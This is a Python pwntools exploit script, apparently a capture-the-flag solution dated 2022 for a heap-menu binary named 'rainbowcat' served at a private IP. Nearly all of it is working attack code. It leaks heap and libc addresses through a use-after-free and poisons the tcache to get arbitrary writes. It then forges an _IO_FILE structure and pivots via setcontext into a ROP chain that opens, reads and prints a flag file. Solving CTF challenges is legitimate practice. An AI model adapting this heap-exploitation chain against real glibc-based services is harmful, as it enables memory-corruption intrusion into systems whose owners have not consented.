# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './rainbowcat'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
# context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '192.168.1.102'
    port = '9999'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(idx ):
    cmd(1)
    sla('get?' , idx)

def edit(idx , text):
    cmd(4)
    sla('one?' , idx)
    sa('cat:' , text)

def show(idx ):
    cmd(3)
    sla('name:' , idx)

def delete(idx ):
    cmd(2)
    sla('abandon?' , idx)

def get(addr ):
    edit(1 , p64(1))
    edit(2 , p64(addr))
    add(0)

def pack_file(_flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = 0,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = 0,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _lock = 0,
    _wide_data = 0,
    _mode = 0):
    file_struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno)
    file_struct = file_struct.ljust(0x88, '\x00')
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, '\x00')
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, '\x00')
    return file_struct

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0)
    delete(0)
    show(0)
    ru('Name:')
    key = uu64(5)

    heap_base = key << 12
    lg('heap_base',heap_base)
    edit(0, '\x00' * 0x10)
    delete(0)
    edit(0, p64(heap_base >> 12 ^ (heap_base + 0x10)))
    add(0)
    add(1)
    delete(0)
    edit(0, '\x00' * 0x10)
    delete(0)
    edit(0, p64(heap_base >> 12 ^ (heap_base + 0x90)))
    add(0)
    add(2)

    for i in range(7):
        delete(1)
        edit(1, '\x00' * 0x10)
    delete(1)
    show(1)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    edit(1, p64(7))
    delete(0)

    for i in range(8):
        get(heap_base + 0x2c0 + i * 2 * (0x10))
        edit(0, p64(0) + p64(0x21))

    for i in range(6):
        get(heap_base + 0x2c0 + (i * 2 + 1) * (0x10))
        edit(1, p64(7))
        delete(0)

    stderr_addr = libc.address + 0x1e15e0
    IO_str_jumps = libc.address + 0x1e2560
    pop_rdi_addr = libc.address + 0x28a55
    pop_rsi_addr = libc.address + 0x2a4cf
    pop_rdx_addr = libc.address + 0xc7f32
    pop_rax_addr = libc.address + 0x44c70
    syscall_addr = libc.address + 0x6105a
    gadget_addr = libc.address + 0x14a0a0 #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    free_hook_addr = libc.address + 0x1e3e20
    malloc_hook_addr = libc.address + 0x1e0b90
    system_addr = libc.address + 0x4fa60
    bin_sh_addr = libc.address + 0x1abf05
    setcontext_addr = libc.address + 0x52970


    get(heap_base + 0x2a0)
    edit(0 , p64((heap_base + 0x2a0) >> 12 ^(stderr_addr + 0x68 - 0x18)) )
    edit(1 , p64(0))
    add(0)

    new_size = 0x398
    copy_heap_addr = heap_base + 0x2a0
    next_chain = 0
    old_blen = (new_size - 100) // 2
    fake_IO_FILE = p64(0) * 2 #set tcache 0xc0
    fake_IO_FILE += p64(0)  # _IO_write_base = 0
    fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff
    fake_IO_FILE += p64(0)
    fake_IO_FILE += p64(copy_heap_addr)  # _IO_buf_base
    fake_IO_FILE += p64(copy_heap_addr + old_blen)  # _IO_buf_end
    fake_IO_FILE = fake_IO_FILE.ljust(0x58, '\x00')
    fake_IO_FILE += p64(next_chain) # _chain
    fake_IO_FILE += p16(1) #tcache count 0x3a0
    fake_IO_FILE = fake_IO_FILE.ljust(0x78, '\x00')
    fake_IO_FILE += p64(heap_base) # _lock = writable address
    fake_IO_FILE = fake_IO_FILE.ljust(0xB0, '\x00')
    fake_IO_FILE += p64(0)  # _mode = 0
    fake_IO_FILE = fake_IO_FILE.ljust(0xC8, '\x00')
    fake_IO_FILE += p64(IO_str_jumps + 0x18 - 0x18)  #vtable
    fake_IO_FILE = fake_IO_FILE.ljust(0x230, '\x00')
    fake_IO_FILE += p64(free_hook_addr) #tcache 0x3a0

    for i in range(0, len(fake_IO_FILE), 0x10):
        get(heap_base + 0x20 + i)
        edit(0, fake_IO_FILE[i:i + 0x10])

    fake_frame_addr = free_hook_addr
    frame = SigreturnFrame()
    frame.rdi = fake_frame_addr + 0xF8
    frame.rsi = 0
    frame.rdx = 0x200
    frame.rsp = fake_frame_addr + 0xF8 + 0x18
    frame.rip = pop_rdi_addr + 1  # : ret

    rop_data = [
        pop_rax_addr,  # sys_open('flag', 0)
        2,
        syscall_addr,
        pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
        0,
        pop_rdi_addr,
        3,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_addr,

        pop_rax_addr,  # sys_write(1, heap, 0x100)
        1,
        pop_rdi_addr,
        1,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_addr
    ]
    payload = p64(gadget_addr) + p64(free_hook_addr) + '\x00' * 0x10
    payload += p64(setcontext_addr + 61) + str(frame).ljust(0xF8, '\x00')[0x28:] + 'flag'.ljust(0x18, '\x00') + flat(rop_data)

    for i in range(0, len(payload), 0x10):
        get(heap_base + 0x2a0 + i)
        edit(0, payload[i:i + 0x10])

    edit(1, p16(1))
    edit(2, p64(free_hook_addr))
    add(0)

    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   rainbowcat.py
@Time    :   2022/07/02 11:46:31
@Author  :   Niyah 
'''